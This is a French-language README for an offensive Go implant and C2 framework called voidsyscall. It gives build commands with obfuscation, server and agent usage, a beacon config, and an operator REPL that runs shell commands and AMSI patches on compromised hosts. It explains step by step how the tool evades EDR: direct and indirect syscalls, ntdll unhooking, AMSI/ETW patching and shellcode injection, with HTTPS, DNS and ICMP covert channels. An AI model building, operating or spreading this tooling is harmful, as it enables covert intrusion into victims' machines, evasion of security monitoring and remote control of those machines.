# voidsyscall

[![Go](https://img.shields.io/badge/go-1.24-00ADD8?logo=go&logoColor=white)](https://go.dev/)
[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Platform: Win/Linux/macOS](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey?logo=linux)](#build)
[![C2 channels](https://img.shields.io/badge/C2-HTTPS%20%7C%20DNS%20%7C%20ICMP-blueviolet)](channels/)
[![Implant syscall](https://img.shields.io/badge/implant-syscall%20only-critical?logo=intel)](syscallwin/)
[![Latest](https://img.shields.io/github/v/release/VoidSecSoftwares/voidsyscall?include_prereleases&logo=semver)](#build)
[![Build](https://img.shields.io/badge/build-Makefile%20%2F%20build.ps1-success)](#build)

Implant + C2 qui ne traverse **aucune** couche WinAPI usermode. Résolution des
numéros de syscall NT à la volée depuis une image mémoire de `ntdll`, appels
`SYSCALL`/`SYSENTER` directs en asm Plan9, et transport C2 chiffré AES-GCM sur
HTTP(S), DNS et ICMP. Cible d'usage : Windows. Dégradé propre : Linux / macOS.

Ce n'est pas un autre wrapper d'API. Chaque primitive d'évasion part de
`syscallwin` : allocation, écriture, protection, création de thread, token,
tout passe par `Nt*` résolu dynamiquement. Si tu veux être hooké par une EDR,
va ailleurs.

---

## TL;DR

| | |
|---|---|
| **SSN resolution** | parse PEB→LDR→ntdll en mémoire, hash djb2 des noms, extraction `B8 ww xx 00 00 0F 05` |
| **Direct syscall** | stub asm → `SYSCALL` natif, SSN + registres posés à la main |
| **Indirect syscall** | saut vers un gadget `syscall; ret` trouvé dans ntdll (Hells Gate) |
| **Unhooking** | restaure la section `.text` de ntdll depuis la copie disque + `NtFlushInstructionCache` |
| **Evasion** | patches AMSI (`AmsiScanBuffer`), ETW (`EtwEventWrite`, `NtTraceEvent`), instrumentation callback, `DbgUiRemoteBreakin` |
| **Post-ex** | injection shellcode via `NtAllocateVirtualMemory`→`NtWriteVirtualMemory`→`NtCreateThreadEx`, variantes APC |
| **Transport** | HTTP(S), DNS (TXT), ICMP v4 — interface `Channel` unifiée, repli automatique |
| **Crypto** | AES-256-GCM, nonce AEAD par message, clés par implant |
| **Beacon** | sleep + jitter X%, killswitch, pas de persistance en v1 |

---

## Layout

```
voidsyscall/
├── cmd/
│   ├── server/         # listeners HTTPS/DNS/ICMP, REPL interactif, task queue
│   └── agent/          # beacon loop + dispatch (Windows-only)
├── syscallwin/         # direct/indirect syscalls NT — Go + asm_amd64.s
│   ├── hash.go         # djb2, djb2w (une seule itération pointeur)
│   ├── resolve.go      # GetModuleBase, findGadget, resolveSSN, findSyscallGadget
│   ├── stubs.go        # ~25 wrappers Nt* appelés par voie de syscall
│   ├── asm_amd64.s     # ; SetGSBase / ReadGSBase / Syscall / IndirectSyscall
│   ├── constants.go    # MEM_*, PAGE_*, THREAD_*, TOKEN_, OBJ_, REG_, FILE_*
│   └── unhook.go       # UnhookNtdll + SelfDel (thread distant qui se suicide)
├── syscallnix/         # mmap/mprotect/munmap brute Linux, fallback macOS
├── patches/            # AMSI / ETW / instrumentation — tout via syscallwin
├── loader/             # injection CreateThread + APC (Nt* uniquement)
├── channels/           # channel.go (Interface), http.go, dns.go, icmp.go
├── crypto/             # Envelope AES-GCM (crypto/crypto_test.go — 3 tests)
├── server/             # SessionManager, Queue, Task/Result
└── agent/              # Config, beacon, handlers shell/inject/patch/sleep/exit
```

---

## Build

```bash
# Windows agent (beacon + syscalls)
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o voidsyscall-agent.exe ./cmd/agent

# Windows server
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o voidsyscall-server.exe ./cmd/server

# Cross-platform server + syscallnix
GOOS=linux  GOARCH=amd64 go build -ldflags="-s -w" -o voidsyscall-server-linux ./cmd/server
GOOS=darwin GOARCH=arm64 go build -ldflags="-s -w" -o voidsyscall-server-darwin ./cmd/server
```

Obfuscation (installe d'abord `go install mvdan.cc/garble@latest`) :

```bash
GOOS=windows GOARCH=amd64 garble -literals -tiny build -ldflags="-s -w" -o voidsyscall-agent.exe ./cmd/agent
```

> **Note GPO/EDR** : garble déclenche les signatures heuristiques d'av au *link*
> final (le binaire embarqué est mappé en mémoire avec permissions RWX au moment
> du link). C'est attendu : c'est exactement ce que vérifie une EDR au runtime.
> Pour du chiffré strictement propre, privilégie `-ldflags="-s -w"` seul ou un
> loader délégant.

Wrappers : `build.ps1` (PowerShell) et `Makefile` (`make all`, `make obfuscate`, `make vet`, `make test`).

---

## Utilisation

### Serveur

```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
./voidsyscall-server --cert cert.pem --key key.pem --https-port 443
```

REPL :

```
voidsyscall> sessions
  [0102030405060708] channel=https last=2024-01-01T00:00:00Z tasks=0 results=0

voidsyscall> shell 0102030405060708 whoami
Task queued

voidsyscall> patch 0102030405060708 amsi
Patch task queued

voidsyscall> exit
```

### Agent

```bash
./voidsyscall-agent -c agent/example-config.json
```

```json
{
  "id":       "0102030405060708090a0b0c0d0e0f10",
  "key":      "0000000000000000000000000000000000000000000000000000000000000000",
  "channels": ["https", "dns", "icmp"],
  "server":   "10.0.0.1",
  "path":     "/api/v2/health",
  "jitter_min": 5,
  "jitter_max": 30,
  "sleep":    30,
  "ua":      "Mozilla/5.0 ... "
}
```

Ordre de repli des canaux : `https` → `dns` → `icmp`. Le beacon tourne
`sleep + rand[jitter_min, jitter_max]` secondes.

---

## Comment ça marche : la résolution de SSN (le cœur)

Sur Windows, chaque build de ntdll change les numéros de syscall. Toute tabulation
statique casse dès qu'on croise un patch mardi. Ici le numéro est lu **en direct
depuis l'image en mémoire** :

1. `ReadGSBase` (asm) → TEB `GS:[0x60]` → PEB.
2. Walk PEB→Ldr→InMemoryOrderModuleList pour trouver la base de `ntdll.dll` à l'adresse courante.
3. Depuis le header PE (IMAGE_DOS_HEADER→e_lfanew→IMAGE_NT_HEADERS), lire la table d'export.
4. Hasher le nom de la fonction (`djb2`) et matcher contre chaque `AddressOfNames`.
5. Scanner le prologue de la fonction cible pour le motif `B8 SS SS 00 00 0F 05` (`mov eax, ssn; syscall`).
6. Mettre en cache dans `map[uint32]uint16` pour ne résoudre qu'une fois.

Conséquence directe : les imports ne référencent **jamais** de nom en clair dans
le binaire (uniquement des hash 32 bits), et l'appel final n'utilise ni IAT, ni
n'entre par un hook de ntdll classique.

Patterns gérés par `resolveSSN` : direct `B8..0F05`, `B8..C3` (early-ret) et
Hells Gate `4C 8B D1 B8 .. 0F 05`.

### Indirect syscall

`IndirectSyscallByHash` cherche un gadget `0F 05 C3` (`syscall; ret`) quelque
part dans ntdll, pose le SSN en `eax`, se positionne dessus, et `call` le gadget
depuis `R10`. L'adresse de retour est donc dans ntdll : la chaîne d'appel paraît
provenir de ntdll, pas de l'implant. Un hook du début de fonction n'est pas
contourné à lui seul — c'est l'association SSN runtime + jump gadget qui tient.

### Unhook

`UnhookNtdll` passe la `.text` de ntdll en `PAGE_EXECUTE_READWRITE`, la recopie
depuis la version disque, restaure la protection, puis `NtFlushInstructionCache`.
Après ça les hooks inline user-mode EDR posés sur ntdll sont écrasés, et le cache
de SSN est purgé pour forcer une re-résolution.

---

## Canaux

| Canal | Encodage | Exigence | Repli |
|---|---|---|---|
| HTTPS | POST binaire vers `/api/v2/health`, JSON-type framing, UA randomisé | — | dés |
| DNS | `<idx>-<tot>-<base32 payload>` en sous-domaine, réponse en TXT | DNS ordinateur | dés |
| ICMPv4 | payload dans l'id/séquence d'echo request/reply | raw socket (**root/admin**) | best-effort |

Tous convergent vers l'interface `channels.Channel` :
`Send(ctx, *Message) (*Message, error)` et `Listen(...)`. L'implant n'a aucune
notion du transport : il voit un `Message{ID, Type, Data}`. Aligner un*nouveau
canal (NTP, TURN, DoH) = implémenter `Channel`, pas retoucher l'agent.

---

## Modules / API exposée (bas niveau)

`syscallwin` (build tag `windows`) expose des wrappers qui appellent **uniquement**
par syscall :

`NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtReadVirtualMemory`,
`NtProtectVirtualMemory`, `NtFreeVirtualMemory`, `NtCreateThreadEx`,
`NtOpenProcess`, `NtOpenThread`, `NtSuspend/ResumeProcess`,
`NtTerminateProcess`, `NtClose`, `NtDuplicateObject`, `NtOpenProcessToken`,
`NtQueryInformationToken`, `NtAdjustPrivilegesToken`, `NtCreateKey`,
`NtSetValueKey`, `NtCreateFile`, `NtQuerySystemInformation`,
`NtSetInformationThread`, `NtFlushInstructionCache`, `NtCreateSection`,
`NtMapViewOfSection`, `NtQueryVirtualMemory`, `NtQueueApcThread`.

Des accès génériques de bas niveau restent exposés pour tes propres stubs :
`DirectSyscall(funcName, args...)` et `IndirectSyscallByHash(hash, args...)`.

`patches` regroupe `PatchAMSI`, `PatchETW`, `PatchNtTraceEvent`,
`PatchDbgUiRemoteBreakin`, `PatchInstrumentationCallbacks`,
`ApplyAllPatches`, `ApplyCriticalPatches`.

---

## État

- Fonctionnel v1 : beacon, task queue, canals HTTPS/DNS/ICMP, injection
  (CreateThread + APC), patching AMSI/ETW, crypto AES-GCM (tests pass).
- Pas encore dans ce dépôt : persistance, despawn, chiffrement de session
  renouvelé, implant Linux autonome du beacon, canal DoH/NTP.

## Liens utiles

- [carved4/go-native-syscall](https://github.com/carved4/go-native-syscall) — lib de référence direct/indirect
- [Enelg52/OffensiveGo](https://github.com/Enelg52/OffensiveGo) — weaponisation Go (flags, Plan9 asm, garble)
- [am0nsec/HellsGate](https://github.com/am0nsec/HellsGate) — résolution SSN par le prologue
- [f1zm0/acheron](https://github.com/f1zm0/acheron) — indirect syscalls en Go asm
- [RedTeamNotes - direct syscalls](https://redteam.cafe/blog/offensive-development/hells-gate-direct-syscalls) — le passage historique en français

## License

MIT — [LICENSE](LICENSE).